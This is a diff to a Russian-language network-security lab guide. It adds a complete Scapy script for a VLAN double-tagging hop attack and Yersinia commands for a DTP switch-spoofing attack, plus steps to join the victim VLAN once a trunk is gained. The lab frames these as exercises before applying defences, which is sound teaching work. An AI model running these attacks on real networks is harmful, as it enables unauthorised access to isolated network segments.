@@ -392,7 +392,78 @@ interface GigabitEthernet0/24
  ! native VLAN = 1, DTP включён — уязвимо!
 ```
 
-**4. Воспроизведи атаку** — в реальной лабе используй Yersinia или scapy. В Packet Tracer — отправь фрейм вручную или используй PDU с double tag.
+**4. Воспроизведи атаку — Double Tagging через Scapy (Linux/Kali)**
+
+Установка:
+```bash
+pip install scapy
+```
+
+Скрипт атаки:
+```python
+from scapy.all import *
+
+# Настройки
+INTERFACE   = "eth0"       # интерфейс атакующего
+OUTER_VLAN  = 1            # native VLAN на trunk (дефолт Cisco)
+INNER_VLAN  = 20           # VLAN жертвы
+TARGET_MAC  = "ff:ff:ff:ff:ff:ff"  # broadcast или MAC жертвы
+TARGET_IP   = "192.168.20.1"       # IP в VLAN жертвы
+
+# Собираем double-tagged фрейм вручную
+# Ethernet → outer 802.1Q (VLAN 1) → inner 802.1Q (VLAN 20) → IP → ICMP
+packet = (
+    Ether(dst=TARGET_MAC) /
+    Dot1Q(vlan=OUTER_VLAN) /   # внешний тег — SW1 снимет его
+    Dot1Q(vlan=INNER_VLAN) /   # внутренний тег — SW2 доставит в VLAN 20
+    IP(dst=TARGET_IP) /
+    ICMP()
+)
+
+print(f"[*] Отправляем double-tagged фрейм:")
+print(f"    Outer VLAN: {OUTER_VLAN} (native — будет снят SW1)")
+print(f"    Inner VLAN: {INNER_VLAN} (целевой — SW2 доставит сюда)")
+print(f"    Цель: {TARGET_IP}")
+
+sendp(packet, iface=INTERFACE, verbose=True)
+print("[+] Готово. Проверь трафик в Wireshark на SW2.")
+```
+
+Запуск (нужен root):
+```bash
+sudo python3 vlan_hop.py
+```
+
+Что увидишь в Wireshark на интерфейсе между SW1 и SW2:
+- До SW1: фрейм с **двумя** 802.1Q тегами (VLAN 1 + VLAN 20)
+- После SW1: фрейм с **одним** тегом (VLAN 20) — outer снят
+- На порту жертвы: обычный фрейм **без тега**
+
+> ⚠️ Ответного трафика не будет — атака односторонняя.
+> Для воспроизведения нужен GNS3/EVE-NG с реальными IOS-образами
+> или физический коммутатор Cisco. Packet Tracer double tagging не поддерживает.
+
+**4b. Switch Spoofing через Yersinia (DTP-атака)**
+```bash
+# Установка
+sudo apt install yersinia
+
+# Атака одной командой
+sudo yersinia dtp -attack 1 -interface eth0
+
+# Или через GUI — выбрать DTP → Send DTP Desirable
+sudo yersinia -G
+```
+
+После успешной атаки порт переходит в trunk:
+```bash
+# Убедиться что интерфейс получил trunk
+ip link show eth0
+# Создать саб-интерфейс для нужного VLAN и получить IP через DHCP
+sudo ip link add link eth0 name eth0.20 type vlan id 20
+sudo ip link set eth0.20 up
+sudo dhclient eth0.20
+```
 
 **5. Примени защиту** (команды из раздела выше) и убедись что атака больше не работает.
 
